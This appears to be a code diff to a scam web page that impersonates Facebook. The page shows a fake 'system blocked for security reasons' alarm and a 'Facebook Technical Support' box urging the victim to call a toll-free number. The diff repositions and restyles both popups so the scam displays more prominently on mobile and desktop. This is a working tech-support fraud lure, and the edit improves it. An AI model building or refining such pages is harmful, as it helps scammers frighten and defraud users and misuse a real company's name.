@@ -1,43 +1,33 @@
 <html lang="en"><head>
   <style>
-  /* Position welcomeDiv at the top on all devices */
-#welcomeDiv {
-  position: fixed !important;
-  left: 50% !important;
-  top: 0 !important;
-  transform: translateX(-50%) !important;
-  max-width: 90vw !important;
-  width: auto !important;
-  margin-left: 0 !important; /* Override the original margin-left: 33% */
-  z-index: 9999999 !important;
-  margin-top: 0 !important;
-  border-top-left-radius: 0 !important; /* Remove top border radius */
-  border-top-right-radius: 0 !important; /* Remove top border radius */
-}
+  /* Add specific positioning for chat element */
+  #chat {
+    position: fixed !important;
+    left: 50% !important;
+    top: 40% !important; /* Position above welcomeDiv which is at 50% */
+    transform: translate(-50%, -50%) !important;
+    max-width: 90vw !important;
+    width: auto !important;
+    margin: 0 !important;
+    z-index: 10000000 !important; /* Higher z-index than welcomeDiv */
+    background-color: white;
+    padding: 15px;
+    border-radius: 5px;
+    text-align: center;
+    box-shadow: 0 0 10px rgba(0,0,0,0.5);
+  }
 
-/* Mobile-specific adjustments */
-@media screen and (max-width: 767px) {
+  /* Ensure welcomeDiv is positioned correctly */
   #welcomeDiv {
-    width: 100% !important;
-    max-width: 100% !important;
-    border-radius: 0 !important;
+    position: fixed !important;
+    left: 50% !important;
+    top: 60% !important; /* Position below chat */
+    transform: translate(-50%, -50%) !important;
+    max-width: 90vw !important;
+    width: auto !important;
+    margin: 0 !important;
+    z-index: 9999999 !important;
   }
-  
-  #welcomeDiv p {
-    font-size: 14px !important;
-    padding: 10px !important;
-  }
-}
-
-/* Optional: Add a subtle animation for the welcomeDiv */
-@keyframes slideDown {
-  from { transform: translate(-50%, -100%); }
-  to { transform: translate(-50%, 0); }
-}
-
-#welcomeDiv.visible {
-  animation: slideDown 0.3s ease-out forwards;
-}
   /* Mobile-friendly popup centering */
 @media screen and (max-width: 767px) {
   /* General popup centering */
@@ -289,15 +279,25 @@ s0.parentNode.insertBefore(s1,s0);
         </div>
       </div>
 
-      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+      <!-- <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
         <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this system has been blocked for security reasons. Do not access or restart this mobile. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a facebook expert will guide you through the investigation over the phone. Running this application may put your mobile at risk。<br>
           <strong>
          facebook Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +1 (833) 335-4867
             </span>
           </strong>
         </p>
-      </div>
-      <div id="chat" style="display: none;">
+      </div> -->
+      <!-- Modified welcomeDiv with Facebook branding -->
+<div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);height:auto;width:550px;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+  <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">
+    Access to this system has been blocked for security reasons. Do not access or restart this mobile. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Facebook expert will guide you through the investigation over the phone. Running this application may put your mobile at risk。<br>
+    <strong>
+      Facebook Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">+1 (833) 335-4867</span>
+    </strong>
+  </p>
+</div>
+
+      <!-- <div id="chat" style="display: none;">
         <img src="images/msmm.png">
         <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">facebook Support</span>
         <br>
@@ -315,8 +315,22 @@ s0.parentNode.insertBefore(s1,s0);
             </style>
             <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
                   </svg></div>
-      </div>
-<div id="chat-box">
+      </div> -->
+<!-- Modified chat div with facebook branding -->
+<div id="chat" style="display: none;">
+  <img src="images/msmm.png">
+  <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Facebook Support</span>
+  <br>
+  <p>Facebook Technical Support</p>
+  <h4 style="font-weight:600;color:#0F396D;font-size:22px">+1 (833) 335-4867<br>(Toll-free number)<br><br></h4>
+  <div class="arrow-down">
+    <svg height="1em" viewBox="0 0 320 512">
+      <style>svg { fill: #fff }</style>
+      <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+    </svg>
+  </div>
+</div>
+      <div id="chat-box">
 <span style="color: red;
 font-size: 24px;
 font-weight: 600;
